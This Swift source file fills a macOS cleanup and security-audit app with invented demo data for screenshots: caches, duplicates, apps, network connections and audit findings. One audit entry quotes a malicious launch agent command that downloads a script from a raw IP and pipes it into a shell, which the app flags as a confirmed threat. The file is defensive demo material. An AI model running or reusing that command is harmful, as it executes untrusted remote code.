import Foundation

/// Made-up data for `--snapshot <dir> demo`, so README screenshots show nothing from the machine they were taken on.
/// Apps and tools are invented; addresses are from the documentation ranges (RFC 5737 / RFC 3849).
@MainActor
enum Demo {
    static func fill(junk: JunkModel, duplicates: DuplicatesModel, apps: AppsModel, network: NetworkModel, audit: AuditModel) {
        // Shown in Settings; the argument domain is in-memory only and wins over saved defaults.
        UserDefaults.standard.setVolatileDomain(["awsProfile": "default", "typesafeSSMName": "/bigmac/typesafe-api-key"],
                                                forName: UserDefaults.argumentDomain)
        let home = FS.home
        func lib(_ p: String) -> URL { home.appending(path: "Library/\(p)") }
        let mb: Int64 = 1_000_000

        func items(_ c: JunkCategory, _ list: [(String, Int64)]) -> CategoryResult {
            CategoryResult(items: list.map { JunkItem(url: URL(filePath: $0.0), category: c, size: $0.1 * mb) })
        }
        junk.results = [
            .userCaches: items(.userCaches, [
                (lib("Caches/com.example.notely").path, 812), (lib("Caches/com.example.photon.ShipIt").path, 540),
                (lib("Caches/com.example.sketchpad").path, 318), (lib("Caches/Homebrew").path, 226),
                (lib("Caches/com.example.tunes").path, 94), (lib("Caches/com.apple.helpd").path, 41),
            ]),
            .logs: items(.logs, [(lib("Logs/DiagnosticReports").path, 64), (lib("Logs/com.example.notely").path, 22)]),
            .developer: items(.developer, [
                (lib("Developer/Xcode/DerivedData").path, 6_420), (lib("Developer/CoreSimulator/Caches").path, 2_180),
            ]),
            .packageCaches: items(.packageCaches, [(home.appending(path: ".npm/_cacache").path, 1_350), (lib("Caches/pip").path, 610)]),
            .trash: items(.trash, [(home.appending(path: ".Trash/old-export.zip").path, 455)]),
            .oldDownloads: items(.oldDownloads, [(home.appending(path: "Downloads/installer-2024.dmg").path, 1_120)]),
        ]
        junk.selected = Set(junk.results[.userCaches]!.items.prefix(4).map(\.url))
        junk.status = "Found \(junk.allItems.reduce(0) { $0 + $1.size }.bytes) in \(junk.allItems.count) items"

        let pics = home.appending(path: "Pictures"), docs = home.appending(path: "Documents")
        duplicates.groups = [
            DuplicateGroup(id: "a1", size: 48 * mb, files: [pics.appending(path: "Trip/IMG_2041.mov"), home.appending(path: "Desktop/IMG_2041.mov")]),
            DuplicateGroup(id: "b2", size: 12 * mb, files: [docs.appending(path: "Manual.pdf"), home.appending(path: "Downloads/Manual.pdf"),
                                                            home.appending(path: "Desktop/Manual (1).pdf")]),
            DuplicateGroup(id: "c3", size: 6 * mb, files: [pics.appending(path: "Wallpapers/dunes.heic"), home.appending(path: "Downloads/dunes.heic")]),
        ]
        duplicates.status = "\(duplicates.groups.count) groups · \(duplicates.wasted.bytes) reclaimable"

        let day: TimeInterval = 86_400
        func app(_ name: String, _ id: String, _ size: Int64, _ daysAgo: Double?, leftovers: Int64 = 0) -> AppInfo {
            AppInfo(url: URL(filePath: "/Applications/\(name).app"), name: name, bundleID: id, version: "2.4.1", size: size * mb,
                    lastUsed: daysAgo.map { Date(timeIntervalSinceNow: -$0 * day) }, removable: true,
                    leftovers: leftovers > 0 ? [lib("Application Support/\(name)")] : [], leftoverSize: leftovers * mb)
        }
        apps.apps = [
            app("Sketchpad", "com.example.sketchpad", 640, 2), app("Notely", "com.example.notely", 310, 0.2),
            app("Photon Editor", "com.example.photon", 1_820, 210, leftovers: 380), app("Tunes Lite", "com.example.tunes", 220, 400, leftovers: 95),
            app("Gridline", "com.example.gridline", 145, 35), app("Old Installer Helper", "com.example.installer", 88, nil),
        ]
        apps.status = "\(apps.apps.count) apps · \(apps.apps.filter { $0.isUnused(days: apps.unusedDays) }.count) unused for 90+ days"

        func row(_ pid: Int32, _ cmd: String, _ exe: String, _ remote: String, _ signer: Signer, _ signals: [RiskSignal]) -> ConnectionRow {
            ConnectionRow(connection: Connection(pid: pid, command: cmd, proto: "TCP", local: "192.168.1.20:5\(pid)", remote: remote, state: "ESTABLISHED"),
                          exePath: exe, signer: signer, signals: signals, firstSeen: Date())
        }
        network.rows = [
            row(812, "syncd", home.appending(path: ".cache/syncd/syncd").path, "203.0.113.45:8443", .adhoc, [.adhoc, .hiddenLocation, .unusualPort]),
            row(640, "Notely", "/Applications/Notely.app/Contents/MacOS/Notely", "198.51.100.12:443", .developer(team: "EXAMPLE01"), []),
            row(533, "Sketchpad", "/Applications/Sketchpad.app/Contents/MacOS/Sketchpad", "[2001:db8::17]:443", .developer(team: "EXAMPLE02"), []),
            row(301, "curl", "/usr/bin/curl", "198.51.100.80:443", .apple, []),
            row(118, "mDNSResponder", "/usr/sbin/mDNSResponder", "203.0.113.53:53", .apple, []),
        ]
        network.status = "\(network.rows.count) connections · 1 flagged"

        let agents = lib("LaunchAgents")
        audit.report.observations = [
            AuditItem(id: "persistence:\(agents.path)/com.example.updater.plist", kind: .persistence, title: "com.example.updater",
                      evidence: ["label: com.example.updater", "runs: /bin/sh -c curl -fsSL http://203.0.113.9/u.sh | sh"],
                      signals: ["pipes a download into a shell", "talks to a raw IP URL",
                                "known technique: download piped into a shell (ATT&CK T1105)"],
                      severity: .high, path: agents.appending(path: "com.example.updater.plist")),
            AuditItem(id: "persistence:\(agents.path)/com.example.notely.helper.plist", kind: .persistence, title: "com.example.notely.helper",
                      evidence: ["runs: /Applications/Notely.app/Contents/Library/LoginItems/Helper"], signals: [], severity: .low),
            AuditItem(id: "process:syncd", kind: .process, title: "syncd", evidence: ["~/.cache/syncd/syncd"],
                      signals: ["ad-hoc signed (no developer identity)", "runs from a hidden folder"], severity: .medium, pid: 812),
            AuditItem(id: "interception:proxy", kind: .interception, title: "System HTTP proxy",
                      evidence: ["HTTPProxy 127.0.0.1:8899"], signals: ["known technique: local proxy intercepting traffic (ATT&CK T1557)"], severity: .medium),
            AuditItem(id: "remote:screenhelp", kind: .remoteAccess, title: "ScreenHelp", evidence: ["auto-starts"],
                      signals: ["remote-control software lets someone else see and drive this Mac"], severity: .medium),
            AuditItem(id: "browser:tabtools", kind: .browser, title: "Tab Tools (Chromium)", evidence: ["permissions: tabs, storage"],
                      signals: [], severity: .low),
            AuditItem(id: "posture:firewall", kind: .posture, title: "Application firewall", evidence: ["Firewall is off"],
                      signals: ["firewall disabled"], severity: .low),
        ]
        audit.verdicts = [
            "persistence:\(agents.path)/com.example.updater.plist": AuditVerdict(call: .confirmed, severity: .high, atRisk: "everything this account can reach",
                rationale: "Fetches and runs a script from a raw IP at every login.", action: "Remove the launch agent and its script."),
            "persistence:\(agents.path)/com.example.notely.helper.plist": AuditVerdict(call: .benign, severity: .none, atRisk: "",
                rationale: "Signed login helper inside the app it belongs to.", action: "None."),
            "browser:tabtools": AuditVerdict(call: .benign, severity: .none, atRisk: "", rationale: "No host access; only tabs and storage.", action: "None."),
        ]
        audit.lastScan = Date(timeIntervalSince1970: 1_761_756_000)
        audit.summarize()
    }
}
